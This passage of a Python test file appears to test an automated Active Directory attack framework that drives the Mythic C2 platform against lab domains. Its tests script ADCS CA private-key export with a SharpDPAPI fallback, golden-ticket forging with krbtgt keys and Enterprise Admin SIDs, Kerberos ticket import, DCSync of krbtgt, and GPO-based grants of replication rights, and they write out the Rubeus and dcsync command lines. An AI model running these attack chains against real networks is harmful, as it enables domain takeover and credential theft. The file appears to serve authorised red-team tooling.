    mt = _make_tools()
    mt._engagement_hops = [
        _proof_hop("remote-exec:ca01@lab.local", 7301, callback_id="13"),
        _proof_hop("local-admin:ca01@lab.local", 7302, callback_id="13"),
    ]
    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)

    async def fake_select(target_host, target_domain, local_account):
        return {
            "id": 91,
            "account": local_account,
            "realm": f"{target_host}.{target_domain}",
            "credential": "CorrectHorseBatteryStaple!",
        }

    monkeypatch.setattr(mt, "_select_managed_local_admin_credential", fake_select)
    outputs = iter([
        "Command executed successfully",
        (
            "b'SAGE_CA_EXPORT_PROOF_ca01_13\\r\\n"
            "CA_HOST=CA01\\r\\n"
            "CA_EXPORT_STATUS=FAILED\\r\\n"
            "CA_EXPORT_ERROR=Cannot export non-exportable private key.\\r\\n'\n\n"
            "[SAGE OPSEC] footprint total=3"
        ),
    ])
    calls = {"issue": 0}

    with _split_issue(lambda: next(outputs), calls, display_id=7404):
        result = json.loads(asyncio.run(mt.execute_capability(
            {
                "capability": "adcs-ca-private-key-export",
                "target_host": "ca01",
                "target_domain": "lab.local",
                "callback_id": "13",
            },
            {"timeout": 5},
        )))

    assert result["ok"] is False
    assert result["verdict"] == "blocked"
    assert result["reason"] == "key not exportable"
    assert calls["issue"] == 2
    assert [item["command"] for item in result["issued"]] == ["wmiexecute", "cat"]
    assert "native_export_repair" not in result


def test_execute_capability_adcs_ca_export_retries_sharpdpapi_when_key_not_exportable(monkeypatch):
    mt = _make_tools()
    mt._engagement_hops = [
        _proof_hop("remote-exec:ca01@lab.local", 7301, callback_id="13"),
        _proof_hop("local-admin:ca01@lab.local", 7302, callback_id="13"),
    ]
    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)

    async def fake_select(target_host, target_domain, local_account):
        return {
            "id": 91,
            "account": local_account,
            "realm": f"{target_host}.{target_domain}",
            "credential": "CorrectHorseBatteryStaple!",
        }

    async def fake_ensure_tool_uploaded(binary_filename):
        return json.dumps({
            "status": "already_present",
            "binary_filename": binary_filename,
            "file_uuid": "sharpdpapi-file-uuid",
        })

    monkeypatch.setattr(mt, "_select_managed_local_admin_credential", fake_select)
    monkeypatch.setattr(mt, "ensure_tool_uploaded", fake_ensure_tool_uploaded)
    dpapi_output = "\n".join([
        "SAGE_CA_EXPORT_PROOF_ca01_13",
        "SharpDPAPI v1.11",
        "Subject : CN=LAB-CA",
        "Thumbprint : ABCDEF123456",
        "-----BEGIN CERTIFICATE-----",
        "MIIB",
        "-----END CERTIFICATE-----",
        "-----BEGIN RSA PRIVATE KEY-----",
        "MIIE",
        "-----END RSA PRIVATE KEY-----",
    ])
    outputs = iter([
        "Command executed successfully",
        (
            "b'SAGE_CA_EXPORT_PROOF_ca01_13\\r\\n"
            "CA_HOST=CA01\\r\\n"
            "CA_EXPORT_STATUS=FAILED\\r\\n"
            "CA_EXPORT_ERROR=Cannot export non-exportable private key.\\r\\n'\n\n"
            "[SAGE OPSEC] footprint total=3"
        ),
        "Uploaded SharpDPAPI.exe",
        dpapi_output,
    ])
    calls = {"issue": 0}

    with _split_issue(lambda: next(outputs), calls, display_id=7403):
        result = json.loads(asyncio.run(mt.execute_capability(
            {
                "capability": "adcs-ca-private-key-export",
                "target_host": "ca01",
                "target_domain": "lab.local",
                "callback_id": "13",
            },
            {"timeout": 5, "allow_adcs_dpapi_retry": True},
        )))

    assert result["ok"] is True, result
    assert result["verdict"] == "achieved"
    assert result["native_export_repair"] == "sharpdpapi"
    assert result["native_export_blocker"] == "key not exportable"
    assert calls["issue"] == 4
    assert [item["command"] for item in result["issued"]] == ["wmiexecute", "cat", "upload", "powerpick"]
    assert result["recorded_effects"] == [
        "adcs-ca-private-key:ca01@lab.local",
        "adcs-ca:ca01@lab.local",
    ]


def test_build_capability_commands_forge_selects_krbtgt_key_and_parent_ea_sid():
    mt = _make_tools()

    async def fake_fetch_credentials(now):
        return [
            {
                "id": 11,
                "account": "krbtgt",
                "realm": "north.sevenkingdoms.local",
                "type": "hash",
                "credential_text": "b" * 32,
            },
            {
                "id": 12,
                "account": "krbtgt",
                "realm": "north.sevenkingdoms.local",
                "type": "key",
                "credential_text": "a" * 64,
            },
        ]

    mt._fetch_credentials_cached = fake_fetch_credentials
    mt._resolve_domain_controller_host = lambda domain: asyncio.sleep(
        0, result="cifs/kingslanding.sevenkingdoms.local"
    )

    plan = json.loads(asyncio.run(mt.build_capability_commands(
        {"capability": "forge-golden-ticket", "domain": "north.sevenkingdoms.local"},
        {
            "domain_sid": "S-1-5-21-111-222-333",
            "parent_domain_sid": "S-1-5-21-444-555-666",
            "parent_domain_sid_source": "BloodHound domain objectid for sevenkingdoms.local",
        },
    )))

    assert plan["ok"] is True
    # Cross-domain (child->parent) forge: import the forged child TGT into the current session and ask Windows
    # to acquire the parent LDAP ticket before the parent DCSync proof.
    assert [item["command"] for item in plan["commands"]] == [
        "shell",
        "shell",
        "execute_assembly",
        "ticket_cache_purge",
        "ticket_cache_add",
        "ticket_cache_list",
        "shell",
        "dcsync",
    ]
    assert plan["commands"][0]["produces"] == ["kerberos_context_inventory"]
    assert plan["commands"][0]["parameters"] == "klist"
    assert plan["commands"][1]["consumes"] == ["kerberos_context_inventory"]
    assert plan["commands"][1]["parameters"] == "dir \\\\kingslanding.sevenkingdoms.local\\C$"
    assert "service" not in plan["execution_plan"]["steps"][1]["parameters"]
    command = plan["commands"][2]
    rendered = command["parameters"]["assembly_arguments"]
    assert rendered.startswith("golden /user:Administrator /domain:north.sevenkingdoms.local")
    assert f"/aes256:{'a' * 64}" in rendered
    assert "/sids:S-1-5-21-444-555-666-519" in rendered
    assert "/ptt" not in rendered
    assert command["produces"] == ["kerberos_ticket_base64"]
    assert "asktgs" not in json.dumps(plan["commands"])
    assert plan["commands"][3]["parameters"] == {"all": True, "serviceName": "", "luid": ""}
    # Import the child TGT into the current Kerberos context before asking the OS for the parent LDAP ticket.
    assert plan["commands"][4]["command"] == "ticket_cache_add"
    assert plan["commands"][4]["deferred"] is True
    assert "kerberos_ticket_base64" in plan["commands"][4]["consumes"]
    assert "kerberos_logon_context" not in plan["commands"][4]["consumes"]
    assert plan["commands"][4]["parameters"] == {"base64ticket": "{{kerberos_ticket_base64}}"}
    assert plan["commands"][5]["command"] == "ticket_cache_list"
    assert plan["commands"][5]["parameters"] == {"luid": "", "getSystemTickets": False}
    assert plan["commands"][6]["command"] == "shell"
    assert plan["commands"][6]["parameters"] == "klist.exe get ldap/kingslanding.sevenkingdoms.local"
    # Parent-DCSync proof: replicate the parent krbtgt from the parent DC (user qualified at issue time).
    dcsync = plan["commands"][7]
    assert dcsync["command"] == "dcsync"
    assert dcsync["parameters"]["domain"] == "sevenkingdoms.local"
    assert dcsync["parameters"]["user"] == "SEVENKINGDOMS\\krbtgt"
    assert dcsync["parameters"]["dc"] == "kingslanding.sevenkingdoms.local"
    assert plan["execution_plan"]["steps"][-1]["operation"] == "drsuapi-dcsync"
    assert plan["action"]["effects"] == ["da:sevenkingdoms.local"]


def test_build_capability_commands_recovers_krbtgt_key_from_recorded_dcsync_task(monkeypatch):
    mt = _make_tools()
    domain = "north.sevenkingdoms.local"
    mt._engagement_hops = [_proof_hop(f"krbtgt-hash:{domain}", 86, callback_id="2")]

    async def empty_credentials(now):
        return []

    dcsync_output = (
        "** SAM ACCOUNT **\r\n"
        "SAM Username         : krbtgt\r\n"
        "Credentials\r\n"
        f"aes256_hmac       : {'a' * 64}\r\n"
        f"rc4_hmac          : {'b' * 32}\r\n"
    )

    async def fake_task_output(mythic, task_display_id):
        assert task_display_id == 86
        return [{"response_text": base64.b64encode(dcsync_output.encode()).decode()}]

    created = []

    async def fake_create_credential(client, credential, account, realm, comment, credential_type):
        created.append({
            "credential": credential,
            "account": account,
            "realm": realm,
            "comment": comment,
            "credential_type": credential_type,
        })
        return {"status": "success", "id": 9001}

    mt._fetch_credentials_cached = empty_credentials
    mt._resolve_domain_controller_host = lambda target_domain: asyncio.sleep(
        0, result="kingslanding.sevenkingdoms.local"
    )
    monkeypatch.setattr(mythic_tools.mythic, "get_all_task_output_by_id", fake_task_output)
    monkeypatch.setattr(mythic_tools.mythic, "create_credential", fake_create_credential)

    plan = json.loads(asyncio.run(mt.build_capability_commands(
        {"capability": "forge-golden-ticket", "domain": domain},
        {
            "domain_sid": "S-1-5-21-111-222-333",
            "parent_domain_sid": "S-1-5-21-444-555-666",
            "parent_domain_sid_source": "BloodHound domain objectid for sevenkingdoms.local",
        },
    )))

    assert plan["ok"] is True, plan
    forge_args = plan["commands"][2]["parameters"]["assembly_arguments"]
    assert f"/aes256:{'a' * 64}" in forge_args
    assert created
    assert {
        "account": "krbtgt",
        "realm": domain,
        "credential_type": "key",
        "credential": "a" * 64,
    }.items() <= created[0].items()
    assert "task 86" in created[0]["comment"]


def test_build_capability_commands_can_opt_into_explicit_asktgs_fallback():
    mt = _make_tools()

    async def fake_fetch_credentials(now):
        return [{
            "id": 12,
            "account": "krbtgt",
            "realm": "child.root.local",
            "type": "key",
            "credential_text": "a" * 64,
        }]

    mt._fetch_credentials_cached = fake_fetch_credentials
    mt._resolve_domain_sid = lambda domain: asyncio.sleep(
        0,
        result={
            "child.root.local": "S-1-5-21-111-222-333",
            "root.local": "S-1-5-21-444-555-666",
        }.get(domain, ""),
    )
    mt._resolve_domain_controller_host = lambda domain: asyncio.sleep(0, result="dc01.root.local")

    plan = json.loads(asyncio.run(mt.build_capability_commands(
        {
            "capability": "forge-golden-ticket",
            "domain": "child.root.local",
            "target_domain": "root.local",
            "kerberos_ticket_acquisition_strategy": "explicit-asktgs",
        },
        {"child_dc": "dc01.child.root.local"},
    )))

    assert plan["ok"] is True
    assert [item["command"] for item in plan["commands"][2:5]] == [
        "execute_assembly",
        "execute_assembly",
        "execute_assembly",
    ]
    assert "/service:krbtgt/root.local" in plan["commands"][3]["parameters"]["assembly_arguments"]
    assert "/service:ldap/dc01.root.local" in plan["commands"][4]["parameters"]["assembly_arguments"]


def test_build_capability_commands_resolves_source_and_parent_domain_sids():
    mt = _make_tools()

    async def fake_fetch_credentials(now):
        return [
            {
                "id": 12,
                "account": "krbtgt",
                "realm": "north.sevenkingdoms.local",
                "type": "key",
                "credential_text": "a" * 64,
            },
        ]

    async def fake_resolve_domain_sid(domain):
        return {
            "north.sevenkingdoms.local": "S-1-5-21-111-222-333",
            "sevenkingdoms.local": "S-1-5-21-444-555-666",
        }.get(domain, "")

    mt._fetch_credentials_cached = fake_fetch_credentials
    mt._resolve_domain_sid = fake_resolve_domain_sid
    mt._resolve_domain_controller_host = lambda domain: asyncio.sleep(
        0, result="kingslanding.sevenkingdoms.local"
    )

    plan = json.loads(asyncio.run(mt.build_capability_commands(
        {
            "capability": "forge-golden-ticket",
            "domain": "north.sevenkingdoms.local",
            "target_domain": "sevenkingdoms.local",
        },
        {},
    )))

    assert plan["ok"] is True
    rendered = plan["commands"][2]["parameters"]["assembly_arguments"]
    assert "/sid:S-1-5-21-111-222-333" in rendered
    assert "/sids:S-1-5-21-444-555-666-519" in rendered
    assert plan["execution_plan"]["steps"][2]["parameters"]["extra_sids"] == ["S-1-5-21-444-555-666-519"]
    assert "service" not in plan["execution_plan"]["steps"][1]["parameters"]
    # Cross-domain proof is a parent-krbtgt DCSync from the parent DC, not a CIFS service-access probe.
    # The default path imports the child TGT and asks Windows for the parent LDAP ticket before DCSync.
    import_step = plan["execution_plan"]["steps"][4]
    assert import_step["operation"] == "kerberos-ticket-import"
    assert import_step["parameters"]["domain"] == "north.sevenkingdoms.local"
    assert "kerberos-inter-realm-referral" not in {
        step["operation"] for step in plan["execution_plan"]["steps"]
    }
    acquire_step = plan["execution_plan"]["steps"][-2]
    assert acquire_step["operation"] == "kerberos-service-ticket-acquire"
    assert acquire_step["parameters"]["service"] == "ldap/kingslanding.sevenkingdoms.local"
    dcsync_step = plan["execution_plan"]["steps"][-1]
    assert dcsync_step["operation"] == "drsuapi-dcsync"
    assert dcsync_step["parameters"]["domain"] == "sevenkingdoms.local"
    assert dcsync_step["parameters"]["account"] == "krbtgt"
    assert dcsync_step["parameters"]["dc"] == "kingslanding.sevenkingdoms.local"


def test_cross_domain_forge_executor_skips_only_leading_preflight_not_current_tgt_import():
    # The executor skips redundant current-context preflight steps when a separate preflight already ran. That
    # heuristic is position-agnostic and ALSO matches the cross-domain chain's core post-forge steps (current
    # TGT import, purge, post-import inventory), because their purposes mention the "current Kerberos context"
    # and the post-import list re-inventories it. Skipping the import collapses the cross-domain chain because
    # Windows never gets the EA-capable TGT that allows native LDAP-ticket acquisition. Drive the REAL classifier
    # + skip predicate over the REAL build payload to lock the position-aware behavior in.
    mt = _make_tools()

    async def fake_fetch_credentials(now):
        return [{"id": 12, "account": "krbtgt", "realm": "north.sevenkingdoms.local", "type": "key", "credential_text": "a" * 64}]

    async def fake_resolve_domain_sid(domain):
        return {"north.sevenkingdoms.local": "S-1-5-21-111-222-333", "sevenkingdoms.local": "S-1-5-21-444-555-666"}.get(domain, "")

    mt._fetch_credentials_cached = fake_fetch_credentials
    mt._resolve_domain_sid = fake_resolve_domain_sid
    mt._resolve_domain_controller_host = lambda domain: asyncio.sleep(0, result="kingslanding.sevenkingdoms.local")

    payload = json.loads(asyncio.run(mt.build_capability_commands(
        {"capability": "forge-golden-ticket", "domain": "north.sevenkingdoms.local", "target_domain": "sevenkingdoms.local"},
        {},
    )))
    commands = payload["commands"]

    # Replay the executor's leading-preflight skip exactly as execute_capability does (preflight already ran).
    issued, core_action_issued = [], False
    for command_obj in commands:
        is_pf = mt._capability_executor_is_current_context_preflight(command_obj)
        if mt._capability_executor_should_skip_leading_preflight(
            is_pf, preflight_ran=True, refresh_current_context=False, core_action_issued=core_action_issued
        ):
            continue
        if not is_pf:
            core_action_issued = True
        issued.append(command_obj["command"])

    # Leading inventory + access-check are skipped (redundant with the separate preflight)…
    assert issued[0] == "execute_assembly"  # golden forge, not the leading klist/dir
    # …but every core step after the forge runs — critically the current-session TGT import, native LDAP-ticket
    # acquisition, and DCSync.
    assert "ticket_cache_add" in issued, f"current-session TGT import was dropped: {issued}"
    assert "dcsync" in issued, f"parent DCSync was dropped: {issued}"
    assert issued.count("execute_assembly") == 1  # golden only; no Rubeus asktgs exchange
    assert issued[-2] == "shell"  # native klist get ldap/<parent dc>
    assert issued[-1] == "dcsync"


def test_cross_domain_forge_issue_boundary_matches_current_cache_oracle():
    mt = _make_tools()

    async def fake_fetch_credentials(now):
        return [{
            "id": 12,
            "account": "krbtgt",
            "realm": "child.root.local",
            "type": "key",
            "credential_text": "a" * 64,
        }]

    async def no_schema(command, callback_display_id):
        return []

    async def no_validation(command, parameters, callback_display_id):
        return None

    mt._fetch_credentials_cached = fake_fetch_credentials
    mt._fetch_command_schema = no_schema
    mt._validate_command_parameters = no_validation
    mt._resolve_domain_sid = lambda domain: asyncio.sleep(
        0,
        result={
            "child.root.local": "S-1-5-21-111-222-333",
            "root.local": "S-1-5-21-444-555-666",
        }.get(domain, ""),
    )
    mt._resolve_domain_controller_host = lambda domain: asyncio.sleep(
        0,
        result="dc01.root.local",
    )
    payload = json.loads(asyncio.run(mt.build_capability_commands(
        {
            "capability": "forge-golden-ticket",
            "domain": "child.root.local",
            "target_domain": "root.local",
        },
        {"child_dc": "dc01.child.root.local"},
    )))
    mt._cross_domain_replication_rights.add("root.local")
    forged_ticket = "A" * 88
    outputs = iter([
        f"[*] base64(ticket.kirbi):\n{forged_ticket}",
        "Ticket cache purged.",
        "Ticket successfully imported.",
        "Cached Tickets: (1)",
        "Cached Tickets: (2)",
        "[DC] 'root.local'\nHash NTLM: 0123456789abcdef0123456789abcdef",
    ])
    calls = {}

    with _split_issue(lambda: next(outputs), calls):
        for command_obj in payload["commands"][2:]:
            asyncio.run(mt._execute_capability_command(command_obj, 13, timeout=5))

    assert [item["command_name"] for item in calls["issued"]] == [
        "execute_assembly",
        "ticket_cache_purge",
        "ticket_cache_add",
        "ticket_cache_list",
        "shell",
        "dcsync",
    ]
    assert forged_ticket in calls["issued"][2]["parameters"]["base64ticket"]
    assert calls["issued"][4]["parameters"] == "klist.exe get ldap/dc01.root.local"
    assert calls["issued"][-1]["parameters"] == {
        "domain": "root.local",
        "user": "ROOT\\krbtgt",
        "dc": "dc01.root.local",
    }


def test_cross_domain_forge_recognizes_parent_dcsync_as_proof():
    # The cross-domain forge proves the parent boundary by replicating the PARENT krbtgt (DCSync), not by a
    # service-access probe. The forge verifier only accepted ticket/service-access probes, so a perfect parent
    # DCSync scored "failed — no forged ticket evidence" and the chain never recorded da:<parent> (stuck 0.444).
    # verify_output must now map a parent-krbtgt dump to domain_admin (achieved), is_final_probe must recognize
    # the step, and a CHILD dump must NOT satisfy a PARENT proof (the child FQDN contains the parent label).
    mt = _make_tools()
    action = capabilities.CapabilityAction(
        name="forge-golden-ticket",
        target="domain=north.sevenkingdoms.local;target_domain=sevenkingdoms.local",
        preconditions=["krbtgt-hash:north.sevenkingdoms.local"],
        effects=["da:sevenkingdoms.local"],
        intent={"capability": "forge-golden-ticket", "domain": "north.sevenkingdoms.local", "target_domain": "sevenkingdoms.local"},
    )
    dcsync_cmd = {
        "command": "dcsync", "expected_probe": "extract_dcsync_secret_probe",
        "produces": [], "consumes": [], "purpose": "prove parent reach by replicating the parent krbtgt",
    }
    inputs = {"target_domain": "sevenkingdoms.local"}

    # The DCSync proof step is the achieving (final) probe of the cross-domain plan.
    assert mt._capability_executor_is_final_probe(dcsync_cmd) is True

    # A PARENT-domain krbtgt dump proves da:parent.
    parent_dump = "[DC] 'sevenkingdoms.local'\nSAM Username : krbtgt\naes256_hmac : " + "f" * 64
    probe, verification = mt._capability_executor_verify_output(action, inputs, 2, parent_dump, dcsync_cmd, capabilities)
    assert probe.get("domain_admin") is True
    assert verification.verdict == "achieved"

    # A CHILD-only dump must NOT satisfy the parent proof, even though "north.sevenkingdoms.local" contains
    # "sevenkingdoms.local" as a substring (boundary match prevents the false positive).
    child_dump = "[DC] 'north.sevenkingdoms.local'\nSAM Username : krbtgt\naes256_hmac : " + "f" * 64
    child_probe, child_verif = mt._capability_executor_verify_output(action, inputs, 2, child_dump, dcsync_cmd, capabilities)
    assert not child_probe.get("domain_admin")
    assert child_verif.verdict != "achieved"


@pytest.mark.parametrize(
    ("capability_name", "effect", "account"),
    [
        ("dcsync-krbtgt", "krbtgt-hash:essos.local", "krbtgt"),
        ("dcsync-account", "creds:administrator@essos.local", "administrator"),
    ],
)
def test_direct_dcsync_capabilities_verify_only_final_secret_probe(capability_name, effect, account):
    mt = _make_tools()
    action = capabilities.CapabilityAction(
        name=capability_name,
        target=f"domain=essos.local;account={account}",
        preconditions=[],
        effects=[effect],
        intent={"capability": capability_name, "domain": "essos.local", "account": account},
    )
    setup_cmd = {
        "command": "load-assembly",
        "expected_probe": "",
        "produces": [],
        "consumes": [],
        "purpose": "load SharpKatz",
    }
    dcsync_cmd = {
        "command": "invoke-assembly",
        "expected_probe": "extract_dcsync_secret_probe",
        "produces": [],
        "consumes": [],
        "purpose": "replicate account secret",
    }
    secret_output = (
        "[!] essos.local will be the domain\n"
        f"[!] ESSOS\\{account} will be the user account\n"
        f"[*] SAM Username         : {account}\n"
        "[*] Credentials:\n"
        "[*] Hash NTLM            : 0123456789abcdef0123456789abcdef\n"
    )

    setup_probe, setup_verification = mt._capability_executor_verify_output(
        action,
        {},
        3,
        "Successfully loaded sharpkatz.exe into the default AppDomain",
        setup_cmd,
        capabilities,
    )
    assert setup_probe is None
    assert setup_verification is None

    probe, verification = mt._capability_executor_verify_output(
        action,
        {},
        3,
        secret_output,
        dcsync_cmd,
        capabilities,
    )
    assert probe["krbtgt_hash_present"] is True
    assert probe["domain"] == "essos.local"
    assert probe["account"] == account
    assert verification.verdict == "achieved"

    no_secret_probe, no_secret_verification = mt._capability_executor_verify_output(
        action,
        {},
        3,
        "[!] essos.local will be the domain\n[*] Object RDN : krbtgt\n[*] Credentials:\n",
        dcsync_cmd,
        capabilities,
    )
    assert no_secret_probe["krbtgt_hash_present"] is False
    assert no_secret_verification.verdict != "achieved"


def test_grant_directory_rights_executor_verifies_only_final_acl_read_probe():
    mt = _make_tools()
    action = capabilities.CapabilityAction(
        name="grant-directory-rights",
        target="domain=range.local;source=gpo-system-exec:srv02-policy",
        preconditions=["system-exec:gpo:srv02-policy@range.local"],
        effects=["ds-replication-rights:range.local"],
        intent={"capability": "grant-directory-rights", "domain": "range.local"},
    )
    setup_cmd = {
        "command": "execute_assembly",
        "operation": "gpo-computer-task",
        "expected_probe": "extract_directory_rights_probe",
        "produces": ["artifact:gpo_immediate_task"],
        "consumes": [],
        "purpose": "schedule StandIn to grant DCSync rights through srv02-policy",
    }
    acl_cmd = {
        "command": "execute_assembly",
        "operation": "ldap-acl-read",
        "expected_probe": "extract_directory_rights_probe",
        "produces": [],
        "consumes": ["event:group_policy_refresh"],
        "purpose": "read target domain ACL for DS-Replication ACE verification",
    }

    setup_probe, setup_verification = mt._capability_executor_verify_output(
        action,
        {},
        9,
        "[+] Set object access rules\n    |_ Success, added dcsync privileges to object for RANGE\\user1",
        setup_cmd,
        capabilities,
    )
    assert setup_probe is None
    assert setup_verification is None
    assert mt._capability_executor_is_final_probe(setup_cmd) is False

    acl_output = """
[+] Identity --> RANGE\\user1
    |_ Type       : Allow
    |_ Permission : ExtendedRight
    |_ Object     : DS-Replication-Get-Changes-All

[+] Identity --> RANGE\\user1
    |_ Type       : Allow
    |_ Permission : ExtendedRight
    |_ Object     : DS-Replication-Get-Changes
"""
    probe, verification = mt._capability_executor_verify_output(
        action,
        {},
        9,
        acl_output,
        acl_cmd,
        capabilities,
    )

    assert mt._capability_executor_is_final_probe(acl_cmd) is True
    assert probe["get_changes"] is True
    assert probe["get_changes_all"] is True
    assert probe["ds_replication_rights"] is True
    assert probe["callback_id"] == "9"
    assert verification.verdict == "achieved"


def test_cross_domain_current_tgt_import_grants_rights_and_precheck_honors_it(monkeypatch):
    # The DCSync rights precheck blocks a premature DCSync (no replication rights, graph populated). The
    # cross-domain forge's proof DCSync was blocked the same way — even though the imported EA-capable child TGT
    # confers the right and lets Windows obtain the parent LDAP ticket — so the wall never crossed. After the
    # forge imports that context, the parent right is granted and the precheck must let the proof DCSync through.
    # Drive the REAL _engagement_issue_hook seam.
    mt = _make_tools()
    mt.client = object()

    async def _ensure_key():
        return None

    async def _reconcile(self_, now):
        return []

    async def _corro(now):
        return []

    async def _refresh(now):
        return None

    mt._ensure_engagement_key = _ensure_key
    monkeypatch.setattr(access_reconciler, "reconcile_access", _reconcile)
    mt._corroboration_facts = _corro
    mt._refresh_graph_facts_if_stale = _refresh
    mt._engagement_graph_facts = [object()]  # graph POPULATED -> absence of the right is real evidence
    mt._engagement_hops = []
    mt._engagement_footholds = []

    params = {"domain": "sevenkingdoms.local", "user": "SEVENKINGDOMS\\krbtgt", "dc": "kingslanding.sevenkingdoms.local"}

    # Without the grant, the parent DCSync is blocked as a rights problem.
    blocked = asyncio.run(mt._engagement_issue_hook("dcsync", params, 2))
    assert blocked is not None and "not attempted" in str(blocked)

    # After the cross-domain forge imports the EA-capable current-session TGT, the parent right is granted…
    mt._cross_domain_replication_rights = {"sevenkingdoms.local"}
    mt._dcsync_precheck_blocks = {}
    # …and the precheck lets the proof DCSync through (no block).
    allowed = asyncio.run(mt._engagement_issue_hook("dcsync", params, 2))
    assert allowed is None


def test_build_capability_commands_ensures_callback_scoped_kerberos_context():
    mt = _make_tools()

    async def fake_fetch_credentials(now):
        return [
            {
                "id": 12,
                "account": "krbtgt",
                "realm": "north.sevenkingdoms.local",
                "type": "key",
                "credential_text": "a" * 64,
            },
        ]

    async def fake_resolve_domain_sid(domain):
        return {
            "north.sevenkingdoms.local": "S-1-5-21-111-222-333",
            "sevenkingdoms.local": "S-1-5-21-444-555-666",
        }.get(domain, "")

    mt._fetch_credentials_cached = fake_fetch_credentials
    mt._resolve_domain_sid = fake_resolve_domain_sid
    mt._resolve_domain_controller_host = lambda domain: asyncio.sleep(
        0, result="kingslanding.sevenkingdoms.local"
    )

    plan = json.loads(asyncio.run(mt.build_capability_commands(
        {
            "capability": "ensure-kerberos-context",
            "domain": "sevenkingdoms.local",
            "source_domain": "north.sevenkingdoms.local",
            "callback_id": "13",
        },
        {},
    )))

    assert plan["ok"] is True
    assert plan["action"]["target"] == (
        "domain=sevenkingdoms.local;callback=13;source_domain=north.sevenkingdoms.local"
    )
    assert plan["action"]["effects"] == [
        "da:sevenkingdoms.local",
        "kerberos-context:sevenkingdoms.local@callback:13",
    ]
    assert {step["capability"] for step in plan["execution_plan"]["steps"]} == {"ensure-kerberos-context"}
    rendered = plan["commands"][2]["parameters"]["assembly_arguments"]
    assert "/domain:north.sevenkingdoms.local" in rendered
    assert "/sid:S-1-5-21-111-222-333" in rendered
    assert "/sids:S-1-5-21-444-555-666-519" in rendered
    assert plan["commands"][1]["parameters"] == "dir \\\\kingslanding.sevenkingdoms.local\\C$"
    assert plan["execution_plan"]["steps"][-1]["parameters"]["resource"] == "\\\\kingslanding.sevenkingdoms.local\\C$"


def test_execute_capability_ensure_kerberos_context_preflights_without_key_or_sid():
    mt = _make_tools()
    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)
    outputs = iter([
        "krbtgt/essos.local for Administrator@essos.local",
        "Directory of \\\\braavos.essos.local\\C$\r\nWindows\r\n",
    ])
    calls = {"issue": 0}

    with _split_issue(lambda: next(outputs), calls, display_id=9901):
        result = json.loads(asyncio.run(mt.execute_capability(
            {
                "capability": "ensure-kerberos-context",
                "domain": "essos.local",
                "callback_id": "14",
            },
            {
                "callback_id": "14",
                "domain": "essos.local",
                "proof_host": "braavos.essos.local",
                "proof_resource": r"\\braavos.essos.local\C$",
            },
        )))

    assert result["ok"] is True, result
    assert result["verdict"] == "achieved"
    assert result["stopped_after"] == "current_context_preflight"
    assert calls["issue"] == 2
    assert [item["command"] for item in result["issued"]] == ["shell", "shell"]
    assert result["issued"][0]["parameters"] == "klist"
    assert "kerberos-context:essos.local@callback:14" in result["achieved_effects"]
    assert result["recorded_effects"] == ["kerberos-context:essos.local@callback:14"]


def test_execute_capability_failure_includes_trajectory_repair(monkeypatch, tmp_path):
    monkeypatch.setenv("SAGE_TRAJECTORY_STORE", str(tmp_path / "trajectory" / "runtime.jsonl"))
    mt = _make_tools()
    mt._resolve_domain_controller_host = lambda domain: asyncio.sleep(0, result="braavos.essos.local")

    async def fake_build(action, inputs):
        return {
            "ok": False,
            "missing": [],
            "reason": "ERROR kull_m_rpc_drsr_CrackName ; CrackNames (name status): 0x00000003 - ERROR_NOT_UNIQUE",
            "commands": [],
        }

    monkeypatch.setattr(mt, "_capability_build_command_payload", fake_build)

    result = json.loads(asyncio.run(mt.execute_capability(
        {
            "capability": "dcsync-account",
            "domain": "essos.local",
            "account": "krbtgt",
            "callback_id": "13",
        },
        {"timeout": 5, "password": "Heartsbane"},
    )))

    assert result["ok"] is False
    assert result["trajectory_repair"]["failure_label"] == "ambiguous_account_name"
    assert result["trajectory_repair"]["repair"]["kind"] == "qualify_principal_with_target_netbios"
    store = Path(result["trajectory_repair"]["store"])
    assert store.exists()
    assert "Heartsbane" not in store.read_text(encoding="utf-8")


def test_execute_capability_reproves_already_achieved_current_context():
    mt = _make_tools()
    state = engagement_state.record_effect_result(
        engagement_state.EngagementState(objective="test"),
        "capability:ensure-kerberos-context",
        "domain=essos.local;callback=14",
        "kerberos-context:essos.local@callback:14",
        "achieved",
        {"source": "test", "task_id": "seed", "callback_id": "14"},
        "2026-06-12T12:00:00Z",
        satisfied_effects=["kerberos-context:essos.local@callback:14"],
    )
    mt._engagement_hops = state.hops
    outputs = iter([
        "krbtgt/essos.local for Administrator@essos.local",
        "Directory of \\\\braavos.essos.local\\C$\r\nWindows\r\n",
    ])
    calls = {"issue": 0}

    with _split_issue(lambda: next(outputs), calls, display_id=9902):
        result = json.loads(asyncio.run(mt.execute_capability(
            {
                "capability": "ensure-kerberos-context",
                "domain": "essos.local",
                "callback_id": "14",
            },
            {"proof_resource": r"\\braavos.essos.local\C$"},
        )))

    assert result["ok"] is True
    assert result["verdict"] == "achieved"
    assert result["stopped_after"] == "current_context_preflight"
    assert [item["command"] for item in result["issued"]] == ["shell", "shell"]
    assert result["issued"][1]["parameters"] == r"dir \\braavos.essos.local\C$"
    assert calls["issue"] == 2


def test_execute_capability_admin_control_proof_alias_reproves_existing_context():
    mt = _make_tools()
    mt._engagement_hops = [
        _proof_hop("da:essos.local", "655", technique="capability:adcs-certificate-auth", target="domain=essos.local"),
        _proof_hop(
            "certificate-auth:administrator@essos.local",
            "655",
            callback_id="14",
            technique="capability:adcs-certificate-auth",
            target="domain=essos.local",
        ),
        _proof_hop("krbtgt-hash:essos.local", "664", callback_id="14", technique="dcsync", target="essos.local"),
        _proof_hop(
            "kerberos-context:essos.local@callback:14",
            "670",
            callback_id="14",
            technique="capability:ensure-kerberos-context",
            target="domain=essos.local;callback=14",
        ),
    ]
    outputs = iter([
        "krbtgt/essos.local for Administrator@essos.local",
        "Directory of \\\\braavos.essos.local\\C$\r\nWindows\r\n",
    ])
    calls = {"issue": 0}

    with _split_issue(lambda: next(outputs), calls, display_id=9904):
        result = json.loads(asyncio.run(mt.execute_capability(
            {
                "capability": "prove-domain-admin-control",
                "domain": "essos.local",
                "callback_id": "14",
            },
            {
                "callback_id": "14",
                "domain": "essos.local",
